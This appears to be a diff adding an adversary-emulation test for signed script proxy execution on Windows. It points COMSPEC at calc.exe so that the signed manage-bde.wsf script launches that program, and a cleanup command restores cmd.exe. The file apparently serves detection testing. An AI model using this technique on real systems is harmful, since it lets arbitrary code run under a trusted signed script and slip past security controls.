@@ -1,0 +1,13 @@
+#TechniqueName: Signed Script Proxy Execution
+#AtomicTestName: manage-bde.wsf Signed Script Command Execution
+#Description: Executes the signed manage-bde.wsf script with options to execute an arbitrary command.&
+#Language: cmd
+
+#commands
+set comspec=%windir%\System32\calc.exe
+cscript %windir%\System32\manage-bde.wsf
+
+
+#cleanup_commands
+set comspec=%windir%\System32\cmd.exe
+
